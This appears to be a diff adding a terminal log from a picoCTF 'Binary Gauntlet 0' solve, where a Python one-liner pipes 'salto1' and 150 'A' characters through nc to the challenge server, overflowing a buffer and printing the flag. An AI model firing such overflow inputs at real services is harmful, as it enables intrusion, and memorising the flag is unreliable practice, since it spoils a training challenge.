@@ -1,0 +1,5 @@
+┌─[cristian@Prestige-13-AI]─[~/Documentos/picoCTF/26/Binary Gauntlet 0]
+└──╼ $ python3 -c "print('salto1'); print('A'*150)" | nc wily-courier.picoctf.net 56599
+salto1
+
+picoCTF{71bbdaa44c97043cfcb1cc1bc5032cf6}
